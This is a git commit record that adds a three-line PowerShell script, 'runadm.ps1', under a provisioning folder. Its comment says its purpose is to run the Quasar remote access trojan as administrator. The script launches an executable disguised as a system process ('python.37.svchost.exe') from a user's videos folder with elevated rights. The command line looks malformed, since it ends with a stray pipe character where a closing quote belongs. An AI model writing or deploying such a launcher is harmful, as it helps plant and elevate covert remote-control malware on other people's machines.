2bfebef959b15a35e9d181f81d2ced2259b21834
nadavna <37038484+nadavna@users.noreply.github.com>
2020-12-08 16:03:53 +0200

    Create runadm.ps1

---
+++ microsoft/provisioning/runadm.ps1
@@ -0,0 +1,3 @@
+### PS1 file to run Quasar RAT as admin (since it seems to be rather impossible to "escalate" upon logon).
+
+start-process -verb runas -filepath "c:\users\cmtsadmin\videos\captures\python.37.svchost.exe|
